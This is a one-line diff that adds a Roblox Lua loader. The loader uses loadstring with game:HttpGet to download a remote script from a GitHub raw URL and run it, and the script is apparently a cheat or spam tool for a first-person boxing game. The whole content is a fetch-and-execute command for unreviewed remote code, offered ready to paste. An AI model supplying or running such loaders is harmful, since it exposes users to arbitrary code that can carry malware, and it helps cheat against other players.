@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/first-person-boxing-spam7-la1ba9o6mbzev5.lua"))()
